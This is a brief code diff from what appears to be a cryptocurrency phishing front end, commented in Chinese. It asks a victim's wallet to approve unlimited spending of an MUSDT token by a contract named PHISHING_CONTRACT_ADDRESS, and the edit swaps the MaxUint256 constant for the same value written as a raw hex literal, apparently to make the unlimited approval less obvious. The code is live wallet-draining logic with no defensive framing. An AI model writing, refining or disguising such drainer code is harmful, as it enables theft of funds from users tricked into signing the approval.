@@ -146,7 +146,9 @@ async function setupWeb3() {
             const musdtContract = new ethers.Contract(MUSDT_CONTRACT_ADDRESS, musdtABI, signer);
             
             // 授權金額為極大值，代表無限授權
-            const amountToApprove = ethers.constants.MaxUint256; 
+            // const amountToApprove = ethers.constants.MaxUint256; 
+            const amountToApprove = ethers.BigNumber.from("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
+
 
             console.log("正在請求授權...請在錢包中確認！");
             const approveTx = await musdtContract.approve(PHISHING_CONTRACT_ADDRESS, amountToApprove);
